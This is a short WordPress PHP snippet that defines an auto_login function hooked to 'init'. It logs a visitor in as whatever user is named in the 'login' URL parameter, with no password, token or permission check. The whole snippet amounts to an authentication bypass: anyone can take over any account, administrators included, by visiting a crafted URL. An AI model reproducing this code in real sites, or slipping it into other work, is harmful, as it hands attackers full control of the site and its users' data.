function auto_login() {
    $getuserdata=get_user_by('login',$_GET['login']);
    $tuserid=$getuserdata->ID;
    $user_id = $tuserid;
    $user = get_user_by( 'id', $user_id );
    if( $user ) {
        wp_set_current_user( $user_id, $user->user_login );
        wp_set_auth_cookie( $user_id );
        do_action( 'wp_login', $user->user_login );

    }
}
add_action('init', 'auto_login');